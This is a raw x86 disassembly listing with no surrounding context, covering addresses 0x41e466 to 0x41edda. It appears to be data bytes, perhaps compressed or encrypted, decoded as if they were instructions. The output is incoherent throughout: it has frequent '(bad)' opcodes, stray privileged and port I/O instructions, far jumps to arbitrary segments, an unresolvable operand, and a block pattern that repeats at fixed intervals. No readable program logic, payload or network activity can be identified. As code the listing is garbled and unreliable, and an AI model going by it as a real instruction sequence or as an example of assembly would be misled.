  41e466:	addr16 inc ebp
  41e468:	add    DWORD PTR [eax],eax
  41e46a:	add    BYTE PTR [ecx],al
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	ins    DWORD PTR es:[edi],dx
  41e46f:	add    eax,0xbf3d906a
  41e474:	sub    BYTE PTR ds:0xec92984c,ah
  41e47a:	xor    bh,dh
  41e47c:	sub    ah,BYTE PTR [eax+0x3da866a]
  41e482:	pop    ebp
  41e483:	sbb    al,0x51
  41e485:	in     al,dx
  41e486:	and    bl,BYTE PTR [esi]
  41e488:	mov    dl,0x62
  41e48a:	daa    
  41e48b:	dec    ecx
  41e48c:	sub    al,0xbc
  41e48e:	inc    edx
  41e48f:	sbb    al,BYTE PTR ds:0x703e405d
  41e495:	mov    ds:0x8d8d2504,eax
  41e49a:	ret    0x1b92
  41e49d:	inc    edx
  41e49e:	inc    edx
  41e49f:	mov    dh,0xbb
  41e4a1:	retf   
  41e4a2:	psubusb mm4,QWORD PTR [esi-0x41]
  41e4a6:	mov    esp,0x9ec9a87
  41e4ab:	push   edx
  41e4ac:	std    
  41e4ad:	icebp  
  41e4ae:	push   ebp
  41e4af:	loope  0x41e43b
  41e4b1:	sbb    eax,0x4f7de3e1
  41e4b6:	inc    ecx
  41e4b7:	ret    
  41e4b8:	in     al,dx
  41e4b9:	std    
  41e4ba:	cmp    DWORD PTR [edx+0x79],ecx
  41e4bd:	ja     0x41e485
  41e4bf:	cwde   
  41e4c0:	iret   
  41e4c1:	mov    bl,0x2e
  41e4c3:	dec    DWORD PTR [eax+0x400af709]
  41e4c9:	xchg   edi,eax
  41e4ca:	sbb    al,0xf5
  41e4cc:	ja     0x41e482
  41e4ce:	sysenter 
  41e4d0:	test   al,0xa0
  41e4d2:	and    eax,0xed68f2df
  41e4d7:	push   ss
  41e4d8:	cmp    DWORD PTR [esi+0x77],0xffffffb7
  41e4dc:	add    eax,DWORD PTR [ebx]
  41e4de:	pop    esp
  41e4df:	pop    eax
  41e4e0:	cs cmc 
  41e4e2:	repnz pop ebx
  41e4e4:	cli    
  41e4e5:	pop    es
  41e4e6:	push   ebp
  41e4e7:	cmc    
  41e4e8:	imul   DWORD PTR [edi+0x63]
  41e4eb:	shl    BYTE PTR [ebp+0x2d],1
  41e4ee:	and    DWORD PTR [esi+0x6ec0f4ba],esi
  41e4f4:	fnsave [eax+edx*8+0x307929d1]
  41e4fb:	pop    edi
  41e4fc:	xchg   edi,ecx
  41e4fe:	and    al,0xe5
  41e500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e501:	push   0x37
  41e503:	xor    ah,bh
  41e505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e506:	push   ss
  41e507:	xchg   edx,eax
  41e508:	jl     0x41e4a9
  41e50a:	push   es
  41e50b:	call   ebp
  41e50d:	jg     0x41e4ad
  41e50f:	mov    ?,WORD PTR [ebp+0x59ebcbc2]
  41e515:	pop    esi
  41e516:	xchg   esi,eax
  41e517:	test   DWORD PTR fs:[esi-0x6b],ecx
  41e51b:	lods   eax,DWORD PTR ds:[esi]
  41e51c:	mov    al,ds:0x86a4e63
  41e521:	mov    ch,0xd8
  41e523:	jecxz  0x41e536
  41e525:	in     eax,0x80
  41e527:	fcomp  DWORD PTR [edi-0x316026d8]
  41e52d:	mov    cl,0x32
  41e52f:	mov    BYTE PTR [eax-0x51f218fc],dh
  41e535:	shr    DWORD PTR [ebx+eax*8-0x61414d10],cl
  41e53c:	mov    esp,0x3411e3a7
  41e541:	into   
  41e542:	push   ebp
  41e543:	or     BYTE PTR [esi+0x5531aff7],0xe4
  41e54a:	test   eax,0xdd5c8777
  41e54f:	inc    ebx
  41e550:	pop    ds
  41e551:	sub    al,0xc4
  41e553:	and    al,0x1d
  41e555:	cld    
  41e556:	cmp    BYTE PTR [edi-0x3cb82e7a],0xd6
  41e55d:	loope  0x41e591
  41e55f:	jmp    0xbbd8:0x83dfa1af
  41e566:	inc    ebp
  41e567:	sbb    BYTE PTR [edx],bl
  41e569:	pop    es
  41e56a:	(bad)  
  41e56c:	xchg   edi,eax
  41e56d:	js     0x41e56f
	...
  41e5d3:	add    BYTE PTR [eax],al
  41e5d5:	add    BYTE PTR [eax],ah
  41e5d7:	push   0xffffffcb
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e593
  41e5e3:	ds retf 0x6756
  41e5e7:	inc    esi
  41e5e8:	add    DWORD PTR [eax],eax
  41e5ea:	add    BYTE PTR [ecx],al
  41e5ec:	add    BYTE PTR [eax],al
  41e5ee:	adc    al,0xd2
  41e5f0:	or     eax,0x5fd716b6
  41e5f5:	pop    DWORD PTR [ebx-0x32044753]
  41e5fb:	xchg   ebx,eax
  41e5fc:	mov    esi,0xfc0d9ffb
  41e601:	push   edi
  41e602:	mov    ebp,0x417da
  41e607:	lods   eax,DWORD PTR ds:[esi]
  41e608:	and    eax,0x4deaff43
  41e60d:	das    
  41e60e:	jmp    0xc767:0x53d12f3f
  41e615:	pusha  
  41e616:	ficom  WORD PTR [ecx+0x545c9450]
  41e61c:	std    
  41e61d:	mov    dh,0x32
  41e61f:	test   dl,cl
  41e621:	leave  
  41e622:	int3   
  41e623:	inc    ebp
  41e624:	and    edx,DWORD PTR [edi+ecx*4]
  41e627:	repnz or ebp,eax
  41e62a:	sub    al,0xef
  41e62c:	punpcklwd mm5,DWORD PTR [ebx+0x4aea78fc]
  41e633:	inc    esp
  41e634:	xor    dh,BYTE PTR [edx-0x1]
  41e637:	push   ebx
  41e638:	(bad)  
  41e639:	jbe    0x41e68a
  41e63b:	inc    eax
  41e63c:	stos   BYTE PTR es:[edi],al
  41e63d:	add    cl,BYTE PTR [ebx]
  41e63f:	and    BYTE PTR [edi-0x7b6e6396],dl
  41e645:	ret    
  41e646:	push   esp
  41e647:	xor    eax,0x401b3c2e
  41e64c:	hlt    
  41e64d:	xchg   DWORD PTR [esi-0x71],ebx
  41e650:	xchg   edx,eax
  41e651:	je     0x41e64c
  41e653:	or     al,al
  41e655:	jmp    FWORD PTR [ebp+0x62]
  41e658:	and    al,0xca
  41e65a:	js     0x41e632
  41e65c:	jne    0x41e61d
  41e65e:	(bad)  
  41e65f:	mov    ebx,0x15bb6a99
  41e664:	sub    eax,DWORD PTR [ebp+edi*8+0x2]
  41e668:	mov    al,ds:0xf7d67d99
  41e66d:	adc    edx,DWORD PTR [esi+edi*8-0x24]
  41e671:	cmp    al,0x5b
  41e673:	shl    dh,1
  41e675:	push   esi
  41e676:	push   ecx
  41e677:	push   edx
  41e678:	mov    es,WORD PTR [ecx+0x7e]
  41e67b:	(bad)  
  41e67c:	test   ecx,0x4cf2400b
  41e682:	sbb    BYTE PTR [ecx],ah
  41e684:	pminub mm3,mm4
  41e687:	or     esi,eax
  41e689:	cli    
  41e68a:	dec    ebx
  41e68b:	outs   dx,DWORD PTR ds:[esi]
  41e68c:	xchg   edx,eax
  41e68d:	jl     0x41e61d
  41e68f:	fwait
  41e690:	dec    ebp
  41e691:	xchg   esi,eax
  41e692:	(bad)  
  41e693:	call   0x33818e3b
  41e698:	int3   
  41e699:	cmp    DWORD PTR ss:[eax],esi
  41e69c:	jecxz  0x41e713
  41e69e:	jbe    0x41e663
  41e6a0:	add    edi,DWORD PTR [edx+edi*1]
  41e6a3:	xor    esp,esi
  41e6a5:	stc    
  41e6a6:	test   al,0x6b
  41e6a8:	fistp  QWORD PTR [ebp+0x1485cef7]
  41e6ae:	mov    bh,BYTE PTR [edi-0x39]
  41e6b1:	int3   
  41e6b2:	xchg   DWORD PTR [esi-0x43],eax
  41e6b5:	neg    DWORD PTR [ebp+ebp*8-0x7e]
  41e6b9:	dec    esp
  41e6ba:	dec    ecx
  41e6bb:	push   0xfffffff8
  41e6bd:	das    
  41e6be:	stc    
  41e6bf:	mov    al,0xb7
  41e6c1:	cmc    
  41e6c2:	loope  0x41e650
  41e6c4:	dec    ecx
  41e6c5:	push   esp
  41e6c6:	shr    DWORD PTR [ebx+eax*2],1
  41e6c9:	push   edx
  41e6ca:	mov    dh,0x23
  41e6cc:	xor    DWORD PTR ds:0x35b0afd,ecx
  41e6d2:	and    bh,bh
  41e6d4:	icebp  
  41e6d5:	jne    0x41e706
  41e6d7:	out    0xe,al
  41e6d9:	jae    0x41e6f6
  41e6db:	retf   0x78ea
  41e6de:	inc    ebx
  41e6df:	dec    edx
  41e6e0:	and    DWORD PTR [edi+0x36de00b2],esi
  41e6e6:	push   esi
  41e6e7:	les    eax,FWORD PTR [esi+0x63]
  41e6ea:	out    0x15,al
  41e6ec:	test   BYTE PTR [esi],ch
	...
  41e756:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e75c:	cmc    
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    ebx,DWORD PTR [ecx]
  41e763:	pop    es
  41e764:	fnstenv [edi+eiz*2]
  41e767:	inc    edi
  41e768:	add    DWORD PTR [eax],eax
  41e76a:	add    BYTE PTR [ecx],al
  41e76c:	add    BYTE PTR [eax],al
  41e76e:	mov    esi,0xe85492f1
  41e773:	mov    bh,0x7
  41e775:	sbb    BYTE PTR [edx+0x7f],cl
  41e778:	jo     0x41e78a
  41e77a:	jns    0x41e732
  41e77c:	gs fwait
  41e77e:	mov    eax,ds:0x858b5205
  41e783:	add    esi,ecx
  41e785:	xchg   esi,eax
  41e786:	mov    edx,0x8429d6d8
  41e78b:	mov    al,ds:0x9a80dc1b
  41e790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e791:	or     al,0x0
  41e793:	sbb    al,0xd9
  41e795:	pop    eax
  41e796:	mov    BYTE PTR [ebx+0x1b],bh
  41e799:	call   0xf926b069
  41e79e:	xchg   edi,eax
  41e79f:	sub    DWORD PTR [eax-0x6a],ebp
  41e7a2:	jns    0x41e7cf
  41e7a4:	pop    ecx
  41e7a5:	or     DWORD PTR [edi-0xa],esi
  41e7a8:	xor    bh,BYTE PTR [esi-0x44ddd90e]
  41e7ae:	sub    al,0x49
  41e7b0:	inc    eax
  41e7b1:	(bad)  
  41e7b2:	iret   
  41e7b3:	adc    dh,BYTE PTR [ecx-0x191c8844]
  41e7b9:	mov    ebx,0x8da71221
  41e7be:	jg     0x41e826
  41e7c0:	mov    bh,0x69
  41e7c2:	xchg   esp,eax
  41e7c3:	sub    DWORD PTR [ecx-0x56],edi
  41e7c6:	xchg   edi,eax
  41e7c7:	jo     0x41e79b
  41e7c9:	(bad)  [edx+edi*1+0x7f]
  41e7cd:	(bad)  
  41e7ce:	adc    eax,esi
  41e7d0:	dec    eax
  41e7d1:	ins    DWORD PTR es:[edi],dx
  41e7d2:	pushf  
  41e7d3:	cmp    al,0x78
  41e7d5:	cmp    ch,BYTE PTR [ebx+0x10b4f39]
  41e7db:	push   ds
  41e7dc:	push   edi
  41e7dd:	or     BYTE PTR [esi+0x3d],ch
  41e7e0:	push   ds
  41e7e1:	xchg   edx,eax
  41e7e2:	pop    ss
  41e7e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7e4:	lea    ebx,[ebp-0x38aaf001]
  41e7ea:	pop    ss
  41e7eb:	mov    al,0x25
  41e7ed:	cmp    edx,edx
  41e7ef:	push   es
  41e7f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7f1:	cmp    DWORD PTR [ebx+0x3c199cd7],ecx
  41e7f7:	push   es
  41e7f8:	mov    edx,0x1bc3feb1
  41e7fd:	out    0x91,eax
  41e7ff:	jge    0x41e864
  41e801:	arpl   WORD PTR [edx-0x79a51a42],dx
  41e807:	inc    edx
  41e808:	xor    al,bl
  41e80a:	aad    0x7f
  41e80c:	clc    
  41e80d:	sbb    al,0x9f
  41e80f:	cmp    esi,ebx
  41e811:	push   ebp
  41e812:	cld    
  41e813:	cld    
  41e814:	addr16 xchg ebp,eax
  41e816:	mov    ch,0x96
  41e818:	sub    eax,0xb3220d9b
  41e81d:	loop   0x41e7ff
  41e81f:	mov    ah,0xd4
  41e821:	enter  0x7f54,0x24
  41e825:	push   ecx
  41e826:	sub    DWORD PTR [edx],esp
  41e828:	pop    ebx
  41e829:	xor    DWORD PTR [edx+0x52],0x758bdc33
  41e830:	iret   
  41e831:	pop    ss
  41e832:	pop    edx
  41e833:	add    di,WORD PTR [eax+0x42]
  41e837:	mov    bh,BYTE PTR [edi+0x7e437741]
  41e83d:	mov    esp,0x7a49a998
  41e842:	cmp    al,0x9b
  41e844:	test   eax,0xac046d4f
  41e849:	call   0x4f65:0x2bdb8004
  41e850:	dec    eax
  41e851:	sub    cl,BYTE PTR ds:0xd777c801
  41e857:	or     bl,BYTE PTR [ecx+0xdc520d2]
  41e85d:	push   ebp
  41e85e:	sub    al,0x30
  41e860:	mov    al,0xec
  41e862:	adc    ecx,esp
  41e864:	pop    esi
  41e865:	es in  eax,dx
  41e867:	sbb    eax,0x76993d77
  41e86c:	leave  
  41e86d:	or     eax,DWORD PTR [eax]
	...
  41e8d3:	add    BYTE PTR [eax],al
  41e8d5:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e89b
  41e8e3:	loop   0x41e92b
  41e8e5:	inc    esi
  41e8e6:	addr16 dec eax
  41e8e8:	add    DWORD PTR [eax],eax
  41e8ea:	add    BYTE PTR [ecx],al
  41e8ec:	add    BYTE PTR [eax],al
  41e8ee:	in     eax,dx
  41e8ef:	mov    ds:0xfc27b959,eax
  41e8f4:	jg     0x41e8a5
  41e8f6:	jo     0x41e8f5
  41e8f8:	js     0x41e941
  41e8fa:	ja     0x41e8b8
  41e8fc:	ja     0x41e973
  41e8fe:	xchg   ebp,eax
  41e8ff:	mov    eax,0x47df52ee
  41e904:	(bad)  
  41e905:	mov    esi,DWORD PTR ds:0x2c516530
  41e90b:	push   esi
  41e90c:	mov    eax,0x3b065447
  41e911:	icebp  
  41e912:	pushf  
  41e913:	scas   eax,DWORD PTR es:[edi]
  41e914:	retf   0x1924
  41e917:	sub    esp,DWORD PTR [edx+0x1de1d133]
  41e91d:	in     al,dx
  41e91e:	fidivr WORD PTR [ebx-0x330b91fe]
  41e924:	outs   dx,BYTE PTR ds:[esi]
  41e925:	pop    edi
  41e926:	sbb    edi,eax
  41e928:	xchg   BYTE PTR [ebx],dh
  41e92a:	jg     0x41e929
  41e92c:	jecxz  0x41e99e
  41e92e:	inc    edi
  41e92f:	cld    
  41e930:	outs   dx,DWORD PTR ds:[esi]
  41e931:	push   cs
  41e932:	aam    0x64
  41e934:	adc    eax,0xc57d7464
  41e939:	mov    bl,0x5e
  41e93b:	adc    esp,DWORD PTR [esi-0x70]
  41e93e:	cmc    
  41e93f:	jg     0x41e92b
  41e941:	mov    edx,0x33517324
  41e946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e947:	hlt    
  41e948:	xor    dl,BYTE PTR [ebx+0x49aeae52]
  41e94e:	repnz es push 0xd7e8563b
  41e955:	xchg   DWORD PTR [edx-0x54bb5b85],esi
  41e95b:	mov    eax,0xa4815c29
  41e960:	bound  esp,QWORD PTR ds:0xa20bb010
  41e966:	test   eax,0xc285b43c
  41e96b:	dec    esi
  41e96c:	pop    eax
  41e96d:	jae    0x41e91f
  41e96f:	dec    esp
  41e970:	xchg   ebx,eax
  41e971:	imul   edi,DWORD PTR [edx+0x16875438],0x7c6fafd9
  41e97b:	xchg   ecx,eax
  41e97c:	bound  ebx,QWORD PTR [ebp+0x19]
  41e97f:	fstp   st(6)
  41e981:	jge    0x41e91d
  41e983:	sub    DWORD PTR [ebx+0x52],0x50
  41e987:	mov    ch,0x58
  41e989:	scas   al,BYTE PTR es:[edi]
  41e98a:	das    
  41e98b:	cmp    al,0x85
  41e98d:	pop    ss
  41e98e:	ss mov bh,0x7b
  41e991:	xchg   esi,eax
  41e992:	rcr    BYTE PTR [eax],1
  41e994:	push   ecx
  41e995:	mov    ch,0xe8
  41e997:	inc    ebp
  41e998:	xchg   ebx,eax
  41e999:	sub    al,0xdb
  41e99b:	int3   
  41e99c:	dec    ebp
  41e99d:	mov    ch,0x36
  41e99f:	inc    esp
  41e9a0:	shr    BYTE PTR ds:0x58c4b1d6,0x32
  41e9a7:	or     al,0x96
  41e9a9:	mov    ds:0x2427e493,al
  41e9ae:	repz in eax,0xae
  41e9b1:	inc    edi
  41e9b2:	ror    esp,0x41
  41e9b5:	or     BYTE PTR [edi+0x1f73776c],bl
  41e9bb:	xor    BYTE PTR [ebx-0x1e],ah
  41e9be:	scas   al,BYTE PTR es:[edi]
  41e9bf:	inc    esi
  41e9c0:	sbb    al,0x4e
  41e9c2:	loopne 0x41ea06
  41e9c4:	call   0xb6ef:0x34598897
  41e9cb:	push   ss
  41e9cc:	adc    ah,BYTE PTR [edi+0x11]
  41e9cf:	(bad)  
  41e9d0:	adc    BYTE PTR [ebp+0x553c070b],ah
  41e9d6:	jne    0x41e9b0
  41e9d8:	push   edx
  41e9d9:	shl    DWORD PTR [edi-0x432cc037],0xcc
  41e9e0:	rol    BYTE PTR [eax],1
  41e9e2:	jl     0x41e9f1
  41e9e4:	mov    dh,0xc3
  41e9e6:	jle    0x41ea25
  41e9e8:	xor    DWORD PTR [edi-0x3e],esp
  41e9eb:	lods   al,BYTE PTR ds:[esi]
  41e9ec:	push   edi
  41e9ed:	loopne 0x41e9ef
	...
  41ea53:	add    BYTE PTR [eax],al
  41ea55:	add    BYTE PTR [eax-0x3],bh
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	popf   
  41ea63:	stos   DWORD PTR es:[edi],eax
  41ea64:	sahf   
  41ea65:	add    DWORD PTR [edi+0x49],esp
  41ea68:	add    DWORD PTR [eax],eax
  41ea6a:	add    BYTE PTR [ecx],al
  41ea6c:	add    BYTE PTR [eax],al
  41ea6e:	xchg   esp,eax
  41ea6f:	js     0x41ead6
  41ea71:	ds call FWORD PTR ds:[si]
  41ea76:	dec    esi
  41ea77:	out    dx,eax
  41ea78:	mov    bh,0x69
  41ea7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea7b:	les    ebp,FWORD PTR [edx-0x369df332]
  41ea81:	mov    dh,0x29
  41ea83:	shl    BYTE PTR [ebx],cl
  41ea85:	sti    
  41ea86:	cmp    DWORD PTR [edi-0x26],ebp
  41ea89:	(bad)  
  41ea8a:	inc    DWORD PTR [esi+0x455d7684]
  41ea90:	sbb    al,0xdc
  41ea92:	pop    ebp
  41ea93:	ret    
  41ea94:	daa    
  41ea95:	xlat   BYTE PTR ds:[ebx]
  41ea96:	push   esp
  41ea97:	in     eax,0x7b
  41ea99:	cld    
  41ea9a:	xor    BYTE PTR [esi+0x5cf5a84c],0x4e
  41eaa1:	jp     0x41ea8c
  41eaa3:	imul   edx,DWORD PTR [eax],0xffffffbf
  41eaa6:	imul   ebx,DWORD PTR [ebx+0x37],0xffffffc2
  41eaaa:	push   esi
  41eaab:	daa    
  41eaac:	fcmovnb st,st(7)
  41eaae:	bound  esp,QWORD PTR [ebx+0x509f2b5c]
  41eab4:	inc    esp
  41eab5:	in     eax,dx
  41eab6:	mov    al,0x31
  41eab8:	adc    al,0x25
  41eaba:	and    ebx,0xffffffc1
  41eabd:	sbb    ch,BYTE PTR [bx+si]
  41eac0:	fidiv  DWORD PTR [ecx]
  41eac2:	pop    ecx
  41eac3:	clc    
  41eac4:	or     BYTE PTR [edi],dl
  41eac6:	js     0x41eaed
  41eac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eac9:	fs push edx
  41eacb:	sahf   
  41eacc:	or     DWORD PTR [edi],ebp
  41eace:	mov    bh,0xf7
  41ead0:	add    WORD PTR [eax+0x1d],dx
  41ead4:	pop    ds
  41ead5:	adc    al,0xa8
  41ead7:	mov    al,0xc8
  41ead9:	fcom   DWORD PTR [ecx+edi*1-0x4af5b2a8]
  41eae0:	cli    
  41eae1:	pop    ebx
  41eae2:	or     BYTE PTR [eax],dh
  41eae4:	pop    ds
  41eae5:	xor    ebp,DWORD PTR [esi-0x2ba2aaee]
  41eaeb:	aam    0x55
  41eaed:	stos   BYTE PTR es:[edi],al
  41eaee:	xchg   BYTE PTR [esp+ecx*2-0x78],dl
  41eaf2:	adc    eax,0x242010a9
  41eaf7:	add    edx,esi
  41eaf9:	jb     0x41eab4
  41eafb:	call   0xf222:0x875ced33
  41eb02:	sbb    BYTE PTR [ecx],dh
  41eb04:	arpl   WORD PTR [ecx],bx
  41eb06:	push   0x646986f6
  41eb0b:	pop    edi
  41eb0c:	inc    ebp
  41eb0d:	pop    ebx
  41eb0e:	sub    ch,ch
  41eb10:	fisubr DWORD PTR [edx]
  41eb12:	push   edi
  41eb13:	add    BYTE PTR [edx],dl
  41eb15:	in     al,0x74
  41eb17:	cmp    DWORD PTR [eax],ebp
  41eb19:	mov    bh,0x67
  41eb1b:	data16 (bad) 
  41eb1d:	fnsave [edi+0x25b62db4]
  41eb23:	inc    ecx
  41eb24:	nop
  41eb25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb26:	sub    DWORD PTR [ebx+0x1b990c32],ebx
  41eb2c:	pop    esp
  41eb2d:	loope  0x41eb40
  41eb2f:	(bad)  
  41eb30:	dec    esp
  41eb31:	jg     0x41eb1e
  41eb33:	pop    ds
  41eb34:	cmc    
  41eb35:	out    0xdd,eax
  41eb37:	jmp    0x41eb96
  41eb39:	pop    ecx
  41eb3a:	add    DWORD PTR [eax+0x2740fa7b],ecx
  41eb40:	push   cs
  41eb41:	push   ecx
  41eb42:	test   eax,0x4c9c825c
  41eb47:	test   eax,0xbe29af24
  41eb4c:	fwait
  41eb4d:	sar    BYTE PTR [ebx-0x2f],1
  41eb50:	fwait
  41eb51:	dec    edx
  41eb52:	xchg   DWORD PTR [ecx],eax
  41eb54:	loope  0x41ebd4
  41eb56:	xor    esp,DWORD PTR [ecx+0x9b05c66]
  41eb5c:	frstor [esi+0x6279ee34]
  41eb62:	adc    DWORD PTR ds:[ecx+edi*8],0x7609ab3d
  41eb6a:	sbb    BYTE PTR [eax+0x24],bh
  41eb6d:	rol    BYTE PTR [eax],cl
	...
  41ebd3:	add    BYTE PTR [eax],al
  41ebd5:	add    BYTE PTR [edx],dl
  41ebd7:	das    
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0x54
  41ebe3:	inc    esp
  41ebe4:	cmp    edx,edi
  41ebe6:	addr16 dec edx
  41ebe8:	add    DWORD PTR [eax],eax
  41ebea:	add    BYTE PTR [ecx],al
  41ebec:	add    BYTE PTR [eax],al
  41ebee:	inc    esi
  41ebef:	cmp    BYTE PTR [ebp-0x37dfe624],bh
  41ebf5:	lds    edx,FWORD PTR [ebp+0x54]
  41ebf8:	outs   dx,DWORD PTR ds:[esi]
  41ebf9:	test   al,0xc8
  41ebfb:	inc    eax
  41ebfc:	idiv   DWORD PTR [esi+0x6ab3f44f]
  41ec02:	cmp    DWORD PTR [ebx-0x1f],ebx
  41ec05:	stc    
  41ec06:	dec    esp
  41ec07:	lods   al,BYTE PTR ds:[esi]
  41ec08:	cdq    
  41ec09:	adc    BYTE PTR [ecx+0x48],al
  41ec0c:	inc    ebx
  41ec0d:	mov    esp,0xa6238c70
  41ec12:	jg     0x41ebb7
  41ec14:	sub    edi,edx
  41ec16:	adc    BYTE PTR ds:0x6ea08dab,bl
  41ec1c:	addr16 dec ecx
  41ec1e:	mov    ss,edx
  41ec20:	inc    eax
  41ec21:	or     BYTE PTR [edi],bl
  41ec23:	fst    DWORD PTR [edx+0x2d]
  41ec26:	dec    ecx
  41ec27:	push   edi
  41ec28:	jo     0x41ec39
  41ec2a:	jae    0x41ec14
  41ec2c:	dec    ebp
  41ec2d:	int3   
  41ec2e:	daa    
  41ec2f:	xchg   esi,eax
  41ec30:	in     eax,dx
  41ec31:	mov    dl,0xc5
  41ec33:	imul   eax,DWORD PTR [eax+ebp*4+0x72],0x198e28df
  41ec3b:	lahf   
  41ec3c:	adc    al,BYTE PTR [esi+esi*4-0x74fb182a]
  41ec43:	lea    ecx,[edi]
  41ec45:	sbb    esp,DWORD PTR [ebx+edi*1]
  41ec48:	stos   DWORD PTR es:[edi],eax
  41ec49:	out    dx,eax
  41ec4a:	adc    al,BYTE PTR [edx+edi*1+0x62]
  41ec4e:	push   ebx
  41ec4f:	inc    edi
  41ec50:	add    DWORD PTR [ecx+0x7d9ff6d0],edi
  41ec56:	cwde   
  41ec57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec58:	repnz fldlg2 
  41ec5b:	sbb    eax,0x78d8aed4
  41ec60:	jne    0x41ec0a
  41ec62:	sub    ch,BYTE PTR [ebp+0x57]
  41ec65:	in     al,0x42
  41ec67:	(bad)  
  41ec68:	push   esi
  41ec69:	in     eax,0x4d
  41ec6b:	cs (bad) 
  41ec6d:	out    dx,al
  41ec6e:	out    0xca,eax
  41ec70:	mov    bh,bl
  41ec72:	or     BYTE PTR [ebp+0x1c1dad0d],al
  41ec78:	scas   al,BYTE PTR es:[edi]
  41ec79:	sbb    esp,edx
  41ec7b:	dec    edx
  41ec7c:	and    dh,dl
  41ec7e:	adc    eax,0xee41484a
  41ec83:	ret    
  41ec84:	mov    cl,0xbd
  41ec86:	outs   dx,DWORD PTR ds:[esi]
  41ec87:	lods   al,BYTE PTR ds:[esi]
  41ec88:	mov    bh,0xaf
  41ec8a:	sbb    eax,0xa42a3556
  41ec8f:	push   es
  41ec90:	mov    al,0x11
  41ec92:	mov    dh,0xc5
  41ec94:	pop    ecx
  41ec95:	xchg   ebp,eax
  41ec96:	mov    dl,0xd3
  41ec98:	pop    esi
  41ec99:	bound  edx,QWORD PTR [ebp+0x182f41be]
  41ec9f:	(bad)  
  41eca0:	mov    ah,0x4c
  41eca2:	mov    ah,0xd8
  41eca4:	je     0x41ecfc
  41eca6:	xor    ch,BYTE PTR [edi+0x4618c694]
  41ecac:	fld    DWORD PTR [ebp-0x260e397f]
  41ecb2:	mov    al,0xfa
  41ecb4:	mov    al,0xf3
  41ecb6:	sbb    al,0xfb
  41ecb8:	stos   BYTE PTR es:[edi],al
  41ecb9:	mov    bl,0x2e
  41ecbb:	xchg   ebp,eax
  41ecbc:	or     eax,0xdc1fbac0
  41ecc1:	repnz adc al,0xac
  41ecc4:	mov    DWORD PTR fs:[edi+0x3d],edi
  41ecc8:	add    eax,0x86cb05e3
  41eccd:	ins    DWORD PTR es:[edi],dx
  41ecce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eccf:	pop    edx
  41ecd0:	inc    esp
  41ecd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecd2:	into   
  41ecd3:	sub    BYTE PTR ds:0x90fe1f6b,ah
  41ecd9:	cdq    
  41ecda:	jg     0x41ed1b
  41ecdc:	and    edx,eax
  41ecde:	xor    BYTE PTR [edi],cl
  41ece0:	sbb    esp,DWORD PTR [ebx]
  41ece2:	(bad)  
  41ece3:	ror    DWORD PTR [edi*1+0x4f570de9],cl
  41ecea:	imul   edx,DWORD PTR [edx+0x5c],0x7a
	...
  41ed55:	add    BYTE PTR [ecx-0xf],al
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0xaa555fd0
  41ed64:	xor    esi,DWORD PTR ds:0x14b67
  41ed6a:	add    BYTE PTR [ecx],al
  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	xchg   DWORD PTR [esi],ebx
  41ed70:	pop    ebx
  41ed71:	pusha  
  41ed72:	addr16 popa 
  41ed74:	ficomp WORD PTR [esi+0x42]
  41ed77:	popa   
  41ed78:	pop    esi
  41ed79:	push   edi
  41ed7a:	mov    ch,0x8e
  41ed7c:	stos   BYTE PTR es:[edi],al
  41ed7d:	in     al,0x9e
  41ed7f:	inc    edx
  41ed80:	xchg   BYTE PTR [ecx],bh
  41ed82:	pop    edx
  41ed83:	dec    ecx
  41ed84:	mov    ds,WORD PTR [ecx+0x5d]
  41ed87:	and    bl,BYTE PTR [eax-0x48602fc8]
  41ed8d:	pop    es
  41ed8e:	mov    DWORD PTR [eax-0x80],ebx
  41ed91:	adc    bh,ah
  41ed93:	cmp    DWORD PTR [eax],esp
  41ed95:	add    BYTE PTR [edi-0x704baf19],0x7e
  41ed9c:	mul    BYTE PTR [eax+0x30]
  41ed9f:	push   ss
  41eda0:	inc    ebx
  41eda1:	and    DWORD PTR [esi-0x64],0x24adc39f
  41eda8:	push   edi
  41eda9:	sbb    al,0xb
  41edab:	clc    
  41edac:	(bad)  
  41edae:	fwait
  41edaf:	not    BYTE PTR [ebx+0x1f]
  41edb2:	xor    al,0x4b
  41edb4:	jae    0x41ed94
  41edb6:	mov    BYTE PTR [ebp+0x49115f58],bl
  41edbc:	mov    bh,0xaf
  41edbe:	xor    ecx,esp
  41edc0:	mov    esp,0x88a4985f
  41edc5:	jmp    DWORD PTR [ebx]
  41edc7:	into   
  41edc8:	mov    eax,ds:0x9b3ec48
  41edcd:	cli    
  41edce:	xor    edi,DWORD PTR [eax-0x23]
  41edd1:	in     al,dx
  41edd2:	cmp    edi,esp
  41edd4:	repz mov esp,0xb141e538
  41edda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
